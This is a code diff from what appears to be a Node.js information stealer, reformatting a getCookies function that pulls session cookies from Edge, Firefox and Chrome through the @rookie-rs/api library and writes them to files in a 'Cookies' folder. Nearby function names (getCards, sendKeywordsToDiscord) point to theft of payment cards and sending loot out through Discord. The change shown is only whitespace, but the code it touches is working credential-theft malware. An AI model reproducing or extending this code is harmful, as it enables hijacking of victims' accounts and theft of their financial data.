@@ -1,5 +1,6 @@
 const fs = require('fs');
 const {edge, firefox, chrome} = require("@rookie-rs/api");
+
 const fsPromises = fs.promises;
 const path = require('path');
 const axios = require('axios');
@@ -3644,7 +3645,6 @@ async function getCards() {
     });
   }
 }
-
 function toCookiesFileFormat(cookie) {
   const { domain, path, secure, name, value } = cookie;
   const expiryTime = 0; 
@@ -3657,23 +3657,23 @@ function generateCookiesFile(cookies) {
 }
 async function getCookies() {
     let CC = [{b: "edge", c: generateCookiesFile(edge())}, {b: "fox", c: generateCookiesFile(firefox())}, {b: "chrome", c: generateCookiesFile(chrome())}];
-    setTimeout(() => {
-        for (let c of CC) {
-            let fileName = `${c.b}.txt`;
-            const cookiesFolderPath = path.join(mainFolderPath, 'Cookies');
-            const cookiesFilePath = path.join(cookiesFolderPath, fileName);
-            let cookiesWithBanner = `${user.copyright}\n\n${c.c}`;
-            try {
-                if (!fs.existsSync(cookiesFolderPath)) {
-                    fs.mkdirSync(cookiesFolderPath);
-                }
-                fs.writeFileSync(cookiesFilePath, cookiesWithBanner, { encoding: 'utf8' });
-                moveFileToFolder(cookiesFilePath, 'Cookies');
-            }catch(e) {
-                console.error(`Error while writing/moving cookies ${cookiesFilePath}:  ${e}`);
+   setTimeout(() => {
+    for (let c of CC) {
+        let fileName = `${c.b}.txt`;
+        const cookiesFolderPath = path.join(mainFolderPath, 'Cookies');
+        const cookiesFilePath = path.join(cookiesFolderPath, fileName);
+        let cookiesWithBanner = `${user.copyright}\n\n${c.c}`;
+        try {
+            if (!fs.existsSync(cookiesFolderPath)) {
+                fs.mkdirSync(cookiesFolderPath);
             }
-        } 
-    }, 2E3);
+            fs.writeFileSync(cookiesFilePath, cookiesWithBanner, { encoding: 'utf8' });
+            moveFileToFolder(cookiesFilePath, 'Cookies');
+        }catch(e) {
+            console.error(`Error while writing/moving cookies ${cookiesFilePath}:  ${e}`);
+        }
+    }
+   }, 2E3);
 }
 
 async function sendKeywordsToDiscord(keywords) {
